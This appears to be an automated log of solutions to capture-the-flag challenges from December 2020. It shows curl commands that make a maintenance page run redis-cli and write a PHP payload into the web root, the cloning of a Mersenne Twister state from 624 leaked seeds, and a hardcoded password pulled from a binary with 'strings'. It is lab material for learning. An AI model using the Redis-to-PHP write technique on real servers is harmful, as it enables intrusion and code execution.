                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=set,test,"%3C%3Fphp+readfile('index.php')+%3F%3E"
                Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php readfile('\''index.php'\'') ?>'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=save
                Running: redis-cli --raw -a '<password censored>' 'save'

                OK
                player@58394353a03f:~$ curl http://localhost/some.php
                Warning: Binary output can mess up your terminal. Use "--output -" to tell 
                Warning: curl to output it to your terminal anyway, or consider "--output 
                Warning: <FILE>" to save to a file.
                player@58394353a03f:~$ curl http://localhost/some.php --output -
                REDIS0009�      redis-ver5.0.3�
                �edis-bits�@�ctime�ª�_used-mem
                 aof-preamble��� test<?php

                # We found the bug!!
                #
                #         \   /
                #         .\-/.
                #     /\ ()   ()
                #       \/~---~\.-~^-.
                # .-~^-./   |   \---.
                #      {    |    }   \
                #    .-~\   |   /~-.
                #   /    \  A  /    \
                #         \/ \/
                # 

                echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
                ?>
                example1The site is in maintenance modexample2#We think there's a bug in index.php���'i hplayer@58394353a03f:~$ 

            
2020-12-31 18:17:22.178 +00:00 [VRB] Challenge RedisBugHunt completed
2020-12-31 18:17:22.210 +00:00 [VRB] Running challange SnowballFight
2020-12-31 18:17:22.214 +00:00 [INF] 
6,4,6,1,9,7,8,2,9,7
2020-12-31 18:17:22.214 +00:00 [INF] Player (seed) = 0... if i could only relate the random value to the position... less likely...

                                 4,0  5,0  6,0
             0,1
             0,2
             0,3
             0,4                 4,3  5,3

                  1,5  2,5  3,5  4,5  5,5
                            3,6  4,6  5,6

            
2020-12-31 18:17:22.244 +00:00 [INF] Found in page source when run with impossible difficulty level.

            <!--
                Seeds attempted:
    
                3861918429 - Not random enough
                3322078092 - Not random enough
                3998220575 - Not random enough
                410534870 - Not random enough
                2070460525 - Not random enough
                1110836886 - Not random enough
                775883536 - Not random enough
                3191703455 - Not random enough
                3567083559 - Not random enough
                3682874082 - Not random enough
                3323768966 - Not random enough
                34188078 - Not random enough
                3006892870 - Not random enough
                2699594218 - Not random enough
                1505570164 - Not random enough
                3926645650 - Not random enough
                3319389438 - Not random enough
                80470376 - Not random enough
                2038495799 - Not random enough
                2517998051 - Not random enough
                1933955356 - Not random enough
                4067624188 - Not random enough
                510934693 - Not random enough
                4193633242 - Not random enough
                2970893064 - Not random enough
                755552815 - Not random enough
                939887943 - Not random enough
                4098000048 - Not random enough
                337562999 - Not random enough
                3611235529 - Not random enough
                46235549 - Not random enough
                3514063825 - Not random enough
                1439072023 - Not random enough
                3028677699 - Not random enough
                1932070958 - Not random enough
                843675790 - Not random enough
                4057897398 - Not random enough
                1601003324 - Not random enough
                4164819362 - Not random enough
                3957037662 - Not random enough
                2361676706 - Not random enough
                1107922325 - Not random enough
                807923360 - Not random enough
                4149294445 - Not random enough
                3071312533 - Not random enough
                1556384938 - Not random enough
                131547614 - Not random enough
                4150174309 - Not random enough
                984985671 - Not random enough
                3403809602 - Not random enough
                1286571435 - Not random enough
                361256371 - Not random enough
                1360476949 - Not random enough
                2008996374 - Not random enough
                2143750084 - Not random enough
                3148701348 - Not random enough
                2647131620 - Not random enough
                1923020231 - Not random enough
                3837635104 - Not random enough
                3741000832 - Not random enough
                2029646915 - Not random enough
                525851559 - Not random enough
                3182486595 - Not random enough
                568406468 - Not random enough
                1369229060 - Not random enough
                883904188 - Not random enough
                3741867857 - Not random enough
                3620965687 - Not random enough
                1165743158 - Not random enough
                952453502 - Not random enough
                1852398168 - Not random enough
                90719700 - Not random enough
                843261054 - Not random enough
                2563155661 - Not random enough
                759184857 - Not random enough
                252374427 - Not random enough
                1679692495 - Not random enough
                3876311979 - Not random enough
                2511489072 - Not random enough
                3870151746 - Not random enough
                889444849 - Not random enough
                2875938212 - Not random enough
                928832096 - Not random enough
                3193646113 - Not random enough
                3579450430 - Not random enough
                444131800 - Not random enough
                2683672789 - Not random enough
                330646992 - Not random enough
                1337347569 - Not random enough
                1473926849 - Not random enough
                4284262381 - Not random enough
                916556798 - Not random enough
                1717633509 - Not random enough
                215792150 - Not random enough
                991362734 - Not random enough
                3636884226 - Not random enough
                618165866 - Not random enough
                639668564 - Not random enough
                3093831895 - Not random enough
                2563955973 - Not random enough
                2388645153 - Not random enough
                3268302460 - Not random enough
                2499495620 - Not random enough
                3407934705 - Not random enough
                2284659283 - Not random enough
                1084455721 - Not random enough
                506035836 - Not random enough
                2868072196 - Not random enough
                3751371253 - Not random enough
                1105126058 - Not random enough
                2066017348 - Not random enough
                2433004239 - Not random enough
                1090419362 - Not random enough
                4007163819 - Not random enough
                3138771331 - Not random enough
                51158863 - Not random enough
                1096249409 - Not random enough
                2222273262 - Not random enough
                3251280015 - Not random enough
                955582350 - Not random enough
                2180682604 - Not random enough
                109894808 - Not random enough
                351085528 - Not random enough
                809814934 - Not random enough
                826380072 - Not random enough
                1239853808 - Not random enough
                3486555994 - Not random enough
                3807543273 - Not random enough
                3239768941 - Not random enough
                2442637941 - Not random enough
                659871445 - Not random enough
                4045316522 - Not random enough
                3478081244 - Not random enough
                1285595693 - Not random enough
                1676033003 - Not random enough
                2121166445 - Not random enough
                1123594030 - Not random enough
                1916242499 - Not random enough
                3463690744 - Not random enough
                76369436 - Not random enough
                2092369662 - Not random enough
                444172771 - Not random enough
                1401735748 - Not random enough
                2851950654 - Not random enough
                1212528578 - Not random enough
                3392390866 - Not random enough
                1049544381 - Not random enough
                1714218036 - Not random enough
                3639375418 - Not random enough
                1987713998 - Not random enough
                1128628277 - Not random enough
                2216165700 - Not random enough
                2059913948 - Not random enough
                1151929755 - Not random enough
                2145727301 - Not random enough
                3289960384 - Not random enough
                2890356076 - Not random enough
                1154257427 - Not random enough
                712709568 - Not random enough
                3735104719 - Not random enough
                806598864 - Not random enough
                2342412866 - Not random enough
                3924792215 - Not random enough
                3212213133 - Not random enough
                1837970086 - Not random enough
                4174182310 - Not random enough
                455177230 - Not random enough
                1651605384 - Not random enough
                2047958661 - Not random enough
                1939895333 - Not random enough
                3494723210 - Not random enough
                3970528706 - Not random enough
                654652579 - Not random enough
                3531686802 - Not random enough
                252136060 - Not random enough
                3625169179 - Not random enough
                1102673540 - Not random enough
                4121195157 - Not random enough
                3538716605 - Not random enough
                361244030 - Not random enough
                859017186 - Not random enough
                1098797068 - Not random enough
                1146446094 - Not random enough
                328214935 - Not random enough
                591130884 - Not random enough
                2385035876 - Not random enough
                466882398 - Not random enough
                1791266179 - Not random enough
                4100340394 - Not random enough
                356473570 - Not random enough
                1363057069 - Not random enough
                1485644200 - Not random enough
                1459541602 - Not random enough
                3841599764 - Not random enough
                351386806 - Not random enough
                1956367660 - Not random enough
                2993622963 - Not random enough
                1544852518 - Not random enough
                2504473804 - Not random enough
                1947294430 - Not random enough
                1919144853 - Not random enough
                3730378267 - Not random enough
                3292741402 - Not random enough
                3165248390 - Not random enough
                220401879 - Not random enough
                2138327337 - Not random enough
                1266505319 - Not random enough
                1277108249 - Not random enough
                2079997165 - Not random enough
                2319000009 - Not random enough
                3625138234 - Not random enough
                3660755337 - Not random enough
                3017321195 - Not random enough
                2687763114 - Not random enough
                3888989391 - Not random enough
                1034406963 - Not random enough
                1615657651 - Not random enough
                3815907668 - Not random enough
                2217997507 - Not random enough
                3910977721 - Not random enough
                1104411649 - Not random enough
                1278698643 - Not random enough
                1943527475 - Not random enough
                2155572283 - Not random enough
                821285839 - Not random enough
                2819834221 - Not random enough
                1189776569 - Not random enough
                4138819870 - Not random enough
                837042279 - Not random enough
                1452818392 - Not random enough
                264677987 - Not random enough
                783611586 - Not random enough
                981588504 - Not random enough
                3473111353 - Not random enough
                2365790143 - Not random enough
                2446787392 - Not random enough
                120143468 - Not random enough
                555588153 - Not random enough
                2426050823 - Not random enough
                3305653235 - Not random enough
                3294604498 - Not random enough
                2837385938 - Not random enough
                569422348 - Not random enough
                2609788239 - Not random enough
                826129348 - Not random enough
                1945617798 - Not random enough
                2752485382 - Not random enough
                3464997759 - Not random enough
                4228919848 - Not random enough
                1063805776 - Not random enough
                2116630610 - Not random enough
                1980378725 - Not random enough
                30862977 - Not random enough
                2911979461 - Not random enough
                769901851 - Not random enough
                3547415 - Not random enough
                819640801 - Not random enough
                2548162828 - Not random enough
                2665150241 - Not random enough
                1626776346 - Not random enough
                1323098485 - Not random enough
                3228660357 - Not random enough
                779744306 - Not random enough
                3567579321 - Not random enough
                2789102305 - Not random enough
                3375689963 - Not random enough
                257226926 - Not random enough
                1976495135 - Not random enough
                318673179 - Not random enough
                1991381844 - Not random enough
                2763762776 - Not random enough
                2598953932 - Not random enough
                3232391781 - Not random enough
                2131347419 - Not random enough
                345728627 - Not random enough
                3661605963 - Not random enough
                4087183816 - Not random enough
                1392948139 - Not random enough
                4230793109 - Not random enough
                1235143906 - Not random enough
                972852719 - Not random enough
                1918216743 - Not random enough
                1975156902 - Not random enough
                1273413866 - Not random enough
                673209367 - Not random enough
                1373472504 - Not random enough
                420711068 - Not random enough
                2740547271 - Not random enough
                3067420180 - Not random enough
                1937758621 - Not random enough
                1677185075 - Not random enough
                264709301 - Not random enough
                2498272571 - Not random enough
                66441731 - Not random enough
                3311920894 - Not random enough
                2018814559 - Not random enough
                601659198 - Not random enough
                2865638574 - Not random enough
                3827239189 - Not random enough
                3214881721 - Not random enough
                2172871511 - Not random enough
                2733050176 - Not random enough
                390410708 - Not random enough
                2152034017 - Not random enough
                4079688313 - Not random enough
                1634515544 - Not random enough
                4069901951 - Not random enough
                368133355 - Not random enough
                3175040345 - Not random enough
                2688452259 - Not random enough
                1071759351 - Not random enough
                1352570450 - Not random enough
                3698197156 - Not random enough
                2653060952 - Not random enough
                1201795846 - Not random enough
                971499778 - Not random enough
                3409001440 - Not random enough
                3950300876 - Not random enough
                66544575 - Not random enough
                2039028133 - Not random enough
                2368024338 - Not random enough
                2366915706 - Not random enough
                188399384 - Not random enough
                3471010844 - Not random enough
                2344838630 - Not random enough
                2476879285 - Not random enough
                1631516301 - Not random enough
                3192108782 - Not random enough
                725859452 - Not random enough
                4047438294 - Not random enough
                3422541916 - Not random enough
                2262378508 - Not random enough
                2094401345 - Not random enough
                2521434072 - Not random enough
                2407938914 - Not random enough
                1555359001 - Not random enough
                2074846365 - Not random enough
                1920637399 - Not random enough
                3300969533 - Not random enough
                2814379547 - Not random enough
                3049607562 - Not random enough
                2920017748 - Not random enough
                3383367694 - Not random enough
                114928526 - Not random enough
                816417207 - Not random enough
                181021968 - Not random enough
                1253622095 - Not random enough
                2088981867 - Not random enough
                4160852370 - Not random enough
                906421431 - Not random enough
                2234237933 - Not random enough
                3080434019 - Not random enough
                2337814491 - Not random enough
                604002489 - Not random enough
                2826795523 - Not random enough
                1308338159 - Not random enough
                1418591631 - Not random enough
                1495311069 - Not random enough
                2363894499 - Not random enough
                3129629763 - Not random enough
                681324040 - Not random enough
                1921983799 - Not random enough
                2285303510 - Not random enough
                3377442550 - Not random enough
                3071742289 - Not random enough
                3954581365 - Not random enough
                1565606633 - Not random enough
                2889794756 - Not random enough
                2183802562 - Not random enough
                3927913890 - Not random enough
                1920773832 - Not random enough
                1721788048 - Not random enough
                1199939665 - Not random enough
                2660528622 - Not random enough
                3792906606 - Not random enough
                3511218734 - Not random enough
                1764780800 - Not random enough
                157941071 - Not random enough
                2614676251 - Not random enough
                1256917897 - Not random enough
                3046627150 - Not random enough
                855805157 - Not random enough
                3217721580 - Not random enough
                2724868494 - Not random enough
                1915322717 - Not random enough
                1300108893 - Not random enough
                1309682099 - Not random enough
                4090421492 - Not random enough
                2476386161 - Not random enough
                375446260 - Not random enough
                1205101173 - Not random enough
                503811871 - Not random enough
                1972916495 - Not random enough
                951451491 - Not random enough
                4051455606 - Not random enough
                1169400267 - Not random enough
                3007241255 - Not random enough
                175942623 - Not random enough
                697836446 - Not random enough
                916582610 - Not random enough
                3547332319 - Not random enough
                340130749 - Not random enough
                3337856138 - Not random enough
                2799772539 - Not random enough
                1958128139 - Not random enough
                3594557261 - Not random enough
                2172782361 - Not random enough
                1627974580 - Not random enough
                410269864 - Not random enough
                2492714472 - Not random enough
                3633790221 - Not random enough
                336100740 - Not random enough
                3385771334 - Not random enough
                175113086 - Not random enough
                1123110818 - Not random enough
                4232977986 - Not random enough
                3742153381 - Not random enough
                930577410 - Not random enough
                35544564 - Not random enough
                2285503078 - Not random enough
                1928171665 - Not random enough
                2471414625 - Not random enough
                56660976 - Not random enough
                2583259438 - Not random enough
                3311469583 - Not random enough
                2880459653 - Not random enough
                4033189933 - Not random enough
                315983717 - Not random enough
                4107887722 - Not random enough
                1997363719 - Not random enough
                703566075 - Not random enough
                4138892550 - Not random enough
                1236819556 - Not random enough
                1409287002 - Not random enough
                3294118720 - Not random enough
                2232036019 - Not random enough
                4252794443 - Not random enough
                3224029294 - Not random enough
                805412867 - Not random enough
                4196647199 - Not random enough
                3849594068 - Not random enough
                516193195 - Not random enough
                1143408213 - Not random enough
                3020782016 - Not random enough
                1572843469 - Not random enough
                3565795289 - Not random enough
                2517795229 - Not random enough
                365917988 - Not random enough
                3618717273 - Not random enough
                4128413724 - Not random enough
                3694404542 - Not random enough
                1136474911 - Not random enough
                2872927814 - Not random enough
                4280373392 - Not random enough
                1871767761 - Not random enough
                1021418363 - Not random enough
                2765465906 - Not random enough
                2670150665 - Not random enough
                590091911 - Not random enough
                1785858804 - Not random enough
                458051424 - Not random enough
                2201618284 - Not random enough
                275102102 - Not random enough
                1139549773 - Not random enough
                3725563401 - Not random enough
                3705323012 - Not random enough
                1609240010 - Not random enough
                1018908542 - Not random enough
                169777000 - Not random enough
                2821410261 - Not random enough
                233108791 - Not random enough
                573389751 - Not random enough
                445216101 - Not random enough
                4161791947 - Not random enough
                2326016772 - Not random enough
                2965779346 - Not random enough
                2281985560 - Not random enough
                678538106 - Not random enough
                3663836113 - Not random enough
                1883170092 - Not random enough
                920051685 - Not random enough
                1957059034 - Not random enough
                3519778529 - Not random enough
                988380403 - Not random enough
                2249055855 - Not random enough
                1717849401 - Not random enough
                252153828 - Not random enough
                3266287920 - Not random enough
                500567297 - Not random enough
                928110840 - Not random enough
                609572845 - Not random enough
                3625392707 - Not random enough
                1935679396 - Not random enough
                1790536982 - Not random enough
                2853893474 - Not random enough
                2314329193 - Not random enough
                2771879946 - Not random enough
                3367480767 - Not random enough
                687358273 - Not random enough
                1990934973 - Not random enough
                3658111050 - Not random enough
                718597990 - Not random enough
                3017535367 - Not random enough
                3629971641 - Not random enough
                113356715 - Not random enough
                800657693 - Not random enough
                519105967 - Not random enough
                4229842693 - Not random enough
                1636161736 - Not random enough
                2541629363 - Not random enough
                1126694471 - Not random enough
                773624388 - Not random enough
                960355475 - Not random enough
                232685030 - Not random enough
                900048209 - Not random enough
                4148598359 - Not random enough
                3965250896 - Not random enough
                389400787 - Not random enough
                2444419809 - Not random enough
                2790432855 - Not random enough
                3913649798 - Not random enough
                2391140325 - Not random enough
                1816110006 - Not random enough
                1430912097 - Not random enough
                2640551182 - Not random enough
                3525173731 - Not random enough
                1287294936 - Not random enough
                2820882415 - Not random enough
                4141941152 - Not random enough
                3877674984 - Not random enough
                3127110607 - Not random enough
                1564926696 - Not random enough
                3682997714 - Not random enough
                2227664278 - Not random enough
                256502575 - Not random enough
                56420814 - Not random enough
                1992695811 - Not random enough
                1569195046 - Not random enough
                3947877688 - Not random enough
                2806881655 - Not random enough
                2537282961 - Not random enough
                766133020 - Not random enough
                1361877139 - Not random enough
                1609685925 - Not random enough
                1735188048 - Not random enough
                1968389174 - Not random enough
                1973952427 - Not random enough
                1155163341 - Not random enough
                996258510 - Not random enough
                3993333049 - Not random enough
                1635724600 - Not random enough
                1883772199 - Not random enough
                317110545 - Not random enough
                3992462514 - Not random enough
                3944826537 - Not random enough
                1084113462 - Not random enough
                3009173408 - Not random enough
                2078641908 - Not random enough
                710111455 - Not random enough
                4220383772 - Not random enough
                3419919314 - Not random enough
                1977660679 - Not random enough
                695736330 - Not random enough
                2217887042 - Not random enough
                4252811819 - Not random enough
                71013698 - Not random enough
                4049175189 - Not random enough
                555721613 - Not random enough
                3638239470 - Not random enough
                2852814399 - Not random enough
                2942542572 - Not random enough
                250013270 - Not random enough
                1741315255 - Not random enough
                3102489873 - Not random enough
                1875131133 - Not random enough
                3655113588 - Not random enough
                251233378 - Not random enough
                1096152540 - Not random enough
                1346886032 - Not random enough
                3210923884 - Not random enough
                2573802449 - Not random enough
                2723807227 - Not random enough
                856235443 - Not random enough
                474286843 - Not random enough
                2912255087 - Not random enough
                2442862422 - Not random enough
                2696335268 - Not random enough
                1104806072 - Not random enough
                4031577612 - Not random enough
                1918008896 - Not random enough
                2740693876 - Not random enough
                2954355216 - Not random enough
                67184979 - Not random enough
                4103074061 - Not random enough
                2464246130 - Not random enough
                656103009 - Not random enough
                3101120438 - Not random enough
                1569323020 - Not random enough
                4246981408 - Not random enough
                3624384284 - Not random enough
                210262579 - Not random enough
                694525916 - Not random enough
                2805339316 - Not random enough
                2091708111 - Not random enough
                3697883589 - Not random enough
                3408664018 - Not random enough
                1714044080 - Not random enough
                3669531111 - Not random enough
                2799877087 - Not random enough
                1357793940 - Not random enough
                2396725070 - Not random enough
                2808032626 - Not random enough
                3634251585 - Not random enough
                870420128 - Not random enough
                1051051219 - Not random enough
                2864477545 - Not random enough
                2697870780 - Not random enough
                1009820228 - Not random enough
                3046913404 - Not random enough
                3628354036 - Not random enough
                3280046336 - Not random enough
                705727807 - Not random enough
                1526890803 - Not random enough
                724601804 - Not random enough
                <Redacted!> - Perfect!
              -->
            
2020-12-31 18:17:23.078 +00:00 [INF] 624 random numbers. Use them to clone MT seed table and get the next `Player Name` number. 
seeds = [3861918429,3322078092,3998220575,410534870,2070460525,1110836886,775883536,3191703455,3567083559,3682874082,3323768966,34188078,3006892870,2699594218,1505570164,3926645650,3319389438,80470376,2038495799,2517998051,1933955356,4067624188,510934693,4193633242,2970893064,755552815,939887943,4098000048,337562999,3611235529,46235549,3514063825,1439072023,3028677699,1932070958,843675790,4057897398,1601003324,4164819362,3957037662,2361676706,1107922325,807923360,4149294445,3071312533,1556384938,131547614,4150174309,984985671,3403809602,1286571435,361256371,1360476949,2008996374,2143750084,3148701348,2647131620,1923020231,3837635104,3741000832,2029646915,525851559,3182486595,568406468,1369229060,883904188,3741867857,3620965687,1165743158,952453502,1852398168,90719700,843261054,2563155661,759184857,252374427,1679692495,3876311979,2511489072,3870151746,889444849,2875938212,928832096,3193646113,3579450430,444131800,2683672789,330646992,1337347569,1473926849,4284262381,916556798,1717633509,215792150,991362734,3636884226,618165866,639668564,3093831895,2563955973,2388645153,3268302460,2499495620,3407934705,2284659283,1084455721,506035836,2868072196,3751371253,1105126058,2066017348,2433004239,1090419362,4007163819,3138771331,51158863,1096249409,2222273262,3251280015,955582350,2180682604,109894808,351085528,809814934,826380072,1239853808,3486555994,3807543273,3239768941,2442637941,659871445,4045316522,3478081244,1285595693,1676033003,2121166445,1123594030,1916242499,3463690744,76369436,2092369662,444172771,1401735748,2851950654,1212528578,3392390866,1049544381,1714218036,3639375418,1987713998,1128628277,2216165700,2059913948,1151929755,2145727301,3289960384,2890356076,1154257427,712709568,3735104719,806598864,2342412866,3924792215,3212213133,1837970086,4174182310,455177230,1651605384,2047958661,1939895333,3494723210,3970528706,654652579,3531686802,252136060,3625169179,1102673540,4121195157,3538716605,361244030,859017186,1098797068,1146446094,328214935,591130884,2385035876,466882398,1791266179,4100340394,356473570,1363057069,1485644200,1459541602,3841599764,351386806,1956367660,2993622963,1544852518,2504473804,1947294430,1919144853,3730378267,3292741402,3165248390,220401879,2138327337,1266505319,1277108249,2079997165,2319000009,3625138234,3660755337,3017321195,2687763114,3888989391,1034406963,1615657651,3815907668,2217997507,3910977721,1104411649,1278698643,1943527475,2155572283,821285839,2819834221,1189776569,4138819870,837042279,1452818392,264677987,783611586,981588504,3473111353,2365790143,2446787392,120143468,555588153,2426050823,3305653235,3294604498,2837385938,569422348,2609788239,826129348,1945617798,2752485382,3464997759,4228919848,1063805776,2116630610,1980378725,30862977,2911979461,769901851,3547415,819640801,2548162828,2665150241,1626776346,1323098485,3228660357,779744306,3567579321,2789102305,3375689963,257226926,1976495135,318673179,1991381844,2763762776,2598953932,3232391781,2131347419,345728627,3661605963,4087183816,1392948139,4230793109,1235143906,972852719,1918216743,1975156902,1273413866,673209367,1373472504,420711068,2740547271,3067420180,1937758621,1677185075,264709301,2498272571,66441731,3311920894,2018814559,601659198,2865638574,3827239189,3214881721,2172871511,2733050176,390410708,2152034017,4079688313,1634515544,4069901951,368133355,3175040345,2688452259,1071759351,1352570450,3698197156,2653060952,1201795846,971499778,3409001440,3950300876,66544575,2039028133,2368024338,2366915706,188399384,3471010844,2344838630,2476879285,1631516301,3192108782,725859452,4047438294,3422541916,2262378508,2094401345,2521434072,2407938914,1555359001,2074846365,1920637399,3300969533,2814379547,3049607562,2920017748,3383367694,114928526,816417207,181021968,1253622095,2088981867,4160852370,906421431,2234237933,3080434019,2337814491,604002489,2826795523,1308338159,1418591631,1495311069,2363894499,3129629763,681324040,1921983799,2285303510,3377442550,3071742289,3954581365,1565606633,2889794756,2183802562,3927913890,1920773832,1721788048,1199939665,2660528622,3792906606,3511218734,1764780800,157941071,2614676251,1256917897,3046627150,855805157,3217721580,2724868494,1915322717,1300108893,1309682099,4090421492,2476386161,375446260,1205101173,503811871,1972916495,951451491,4051455606,1169400267,3007241255,175942623,697836446,916582610,3547332319,340130749,3337856138,2799772539,1958128139,3594557261,2172782361,1627974580,410269864,2492714472,3633790221,336100740,3385771334,175113086,1123110818,4232977986,3742153381,930577410,35544564,2285503078,1928171665,2471414625,56660976,2583259438,3311469583,2880459653,4033189933,315983717,4107887722,1997363719,703566075,4138892550,1236819556,1409287002,3294118720,2232036019,4252794443,3224029294,805412867,4196647199,3849594068,516193195,1143408213,3020782016,1572843469,3565795289,2517795229,365917988,3618717273,4128413724,3694404542,1136474911,2872927814,4280373392,1871767761,1021418363,2765465906,2670150665,590091911,1785858804,458051424,2201618284,275102102,1139549773,3725563401,3705323012,1609240010,1018908542,169777000,2821410261,233108791,573389751,445216101,4161791947,2326016772,2965779346,2281985560,678538106,3663836113,1883170092,920051685,1957059034,3519778529,988380403,2249055855,1717849401,252153828,3266287920,500567297,928110840,609572845,3625392707,1935679396,1790536982,2853893474,2314329193,2771879946,3367480767,687358273,1990934973,3658111050,718597990,3017535367,3629971641,113356715,800657693,519105967,4229842693,1636161736,2541629363,1126694471,773624388,960355475,232685030,900048209,4148598359,3965250896,389400787,2444419809,2790432855,3913649798,2391140325,1816110006,1430912097,2640551182,3525173731,1287294936,2820882415,4141941152,3877674984,3127110607,1564926696,3682997714,2227664278,256502575,56420814,1992695811,1569195046,3947877688,2806881655,2537282961,766133020,1361877139,1609685925,1735188048,1968389174,1973952427,1155163341,996258510,3993333049,1635724600,1883772199,317110545,3992462514,3944826537,1084113462,3009173408,2078641908,710111455,4220383772,3419919314,1977660679,695736330,2217887042,4252811819,71013698,4049175189,555721613,3638239470,2852814399,2942542572,250013270,1741315255,3102489873,1875131133,3655113588,251233378,1096152540,1346886032,3210923884,2573802449,2723807227,856235443,474286843,2912255087,2442862422,2696335268,1104806072,4031577612,1918008896,2740693876,2954355216,67184979,4103074061,2464246130,656103009,3101120438,1569323020,4246981408,3624384284,210262579,694525916,2805339316,2091708111,3697883589,3408664018,1714044080,3669531111,2799877087,1357793940,2396725070,2808032626,3634251585,870420128,1051051219,2864477545,2697870780,1009820228,3046913404,3628354036,3280046336,705727807,1526890803,724601804]
2020-12-31 18:17:23.227 +00:00 [VRB] Challenge SnowballFight completed
2020-12-31 18:17:23.258 +00:00 [VRB] Running challange SpeakerDoorOpen
2020-12-31 18:17:23.262 +00:00 [INF] cat door

                    ��z9��z9���7��z9��z9��z9��z9���7���U��V��0V���U��V��MZ���Z��|Z���Z���Z��R[���[��~[���[���[��/home/
                    elf/doorYou look at the screen. It wants a password. You roll your eyes - the 
                    password is probably stored right in the binary. There's gotta be a
                    tool for this...
                    What do you enter? > opendoor   (bytes Overflowextern " NulErrorBox<Any>thread 'expected, found Do
                    or opened!
                    That would have opened the door!
                    Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"
                    Beep boop invalid password
                    src/liballoc/raw_vec.rscapacity overflowa formatting trait implementation returned an error/usr/sr
                    c/rustc-1.41.1/src/libcore/fmt/mod.rsstack backtrace:
                                      -       �cannot panic during the backtrace function/usr/src/rustc-1.41.1/vendor/
                    backtrace/src/lib.rsSomething went wrong: Checking...Something went wrong reading input: Something
                     went wrong in the environment: couldn't get the executable name
                    Something went wrong in the environment: RESOURCE_IDThe error message is: ask for help!
                    or su or some other process that alters the environment. If this persists, please
                    the NoneSome <= Zerokind    __ZNshim as u128i128charboolmut for< -> dyn  mainfull/ at  environment
                    al variable is missing - that can happen if you're using sudo

            
2020-12-31 18:17:23.304 +00:00 [INF] strings door

                /lib64/ld-linux-x86-64.so.2
                @1(I
                libdl.so.2
                _ITM_deregisterTMCloneTable
                __gmon_start__
                _ITM_registerTMCloneTable
                dladdr
                libpthread.so.0
                nanosleep
                pthread_mutex_init
                pthread_cond_destroy
                pthread_mutexattr_settype
                pthread_rwlock_unlock
                pthread_getspecific
                pthread_condattr_init
                sigaction
                pthread_condattr_setclock
                8STs
                LwH'
                             at 0123456789abcdef
                ) when slicing `
                connection resetentity not foundalready borrowed$
                /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the 
                password is probably stored right in the binary. There's gotta be a
                tool for this...
                What do you enter? > 
                opendoor
                 (bytes Overflowextern "
                NulErrorBox<Any>thread 'expected, found Door opened!
                That would have opened the door!
                Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"
                Beep boop invalid password
                src/liballoc/raw_vec.rscapacity overflowa formatting trait implementation returned an error/usr/src/rustc-1.41.1/src/libcore/fmt/mod.rsstack backtrace:
                 -       
                cannot panic during the backtrace function/usr/src/rustc-1.41.1/vendor/backtrace/src/lib.rsSomething went wrong: Checking...Something went wrong reading input: Something went wrong in the environment: couldn't get the executable name
                Something went wrong in the environment: RESOURCE_IDThe error message is: ask for help!
                or su or some other process that alters the environment. If this persists, please
                the NoneSome <= Zerokind    __ZNshim as u128i128charboolmut for< -> dyn 
                mainfull/
                 at  environmental variable is missing - that can happen if you're using sudo
                There is something wrong with your environment; the most likely reason is that
                Something went wrong, please try again and report if this persists: a Display implementation returned an error unexpectedly00000000-0000-4000-0000-000000000000WARNING: The RESOURCE_ID is 00000000-0000-4000-0000-000000000000 - be sure to use a real one in production!
                resource_id is not a valid uuidv4! It's vresource_id is not a valid uuid (Couldn't get resource_id from the environmental variable ", "action": "00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899
                [...]src/libcore/str/mod.rsbyte index  is not a char boundary; it is inside ) of `begin <= end ( is out of bounds of `Utf8Errorvalid_up_toerror_lenParseIntErrorEmptyInvalidDigitUnderflowsrc/libcore/slice/mod.rs
                ./?\]_
                )147:;=IJ]
                )14:;EFIJ^de
                )EIWde
                EIde
                INOWY^_
                no^"{
                PI73
                G       '       u
                8889
                index  out of range for slice of length slice index starts at  but ends at src/libcore/result.rsattempted to index slice up to maximum usizesrc/libcore/fmt/mod.rssrc/libcore/option.rsErrorsrc/libcore/str/pattern.rs {
                 {  }(
                src/libcore/unicode/bool_trie.rsindex out of bounds: the len is g
                [assertion failed: PAGE_SIZE != 0failed to initiate panic, error  but the index is BorrowErrorBorrowMutError
                assertion failed: broken.is_empty()src/libcore/str/lossy.rs_ZNZN_$SPBPRFLTGTLPRP@_RR__R?[]::{closure:#}::<>, usizeu64u32u16u80x_'...!f64f32isizei64i32i16i8()str&*const ; (,> Cunsafe -" fn( +  = punycode{/usr/src/rustc-1.41.1/vendor/rustc-demangle/src/v0.rs.llvm./root/.cargo/registry/src/github.com-1ecc6299db9ec823/block-buffer-0.9.0/src/lib.rsassertion failed: end <= lensrc/libstd/sys/unix/stack_overflow.rsfailed to allocate an alternative stackstack overflowfailed to get environment variable `src/libstd/env.rsstream did not contain valid UTF-8fatal runtime error: 
                thread '' has overflowed its stack
                environment variable was not valid unicode: environment variable not foundOnce instance has previously been poisonedassertion failed: state_and_queue & STATE_MASK == RUNNINGsrc/libstd/sync/once.rs..src/libstd/path.rsuse of std::thread::current() is not possible after the thread's local data has been destroyedsrc/libstd/thread/mod.rsinconsistent state in unparkinconsistent park statepark state changed unexpectedlythread name may not contain interior null bytesfailed to generate unique thread ID: bitspace exhausteddata provided contains a nul bytefailed to write the buffered dataother os erroroperation interruptedwrite zerotimed outinvalid datainvalid input parameteroperation would blockentity already existsbroken pipeaddress not availableaddress in usenot connectedconnection abortedconnection refusedpermission deniedunexpected end of file (os error )assertion failed: queue != DONEsrc/libstd/sys_common/at_exit_imp.rssrc/libstd/sys/unix/mod.rsassertion failed: signal(libc::SIGPIPE, libc::SIG_IGN) != libc::SIG_ERRcannot access stdin during shutdowncannot access stdout during shutdowncannot access stderr during shutdownstdoutsrc/libstd/io/stdio.rsfailed printing to stderrPoisonError { inner: .. }`: internal error: entered unreachable code<::core::macros::panic macros>Tried to shrink to a larger capacityalready mutably borrowedAccessErrorcannot access a Thread Local Storage value during or after destructionsrc/libstd/sync/condvar.rsattempted to use a condition variable with two mutexessrc/libstd/sys_common/thread_info.rsassertion failed: c.borrow().is_none()assertion failed: key != 0src/libstd/sys/unix/thread_local.rssrc/libstd/sys/unix/condvar.rs"
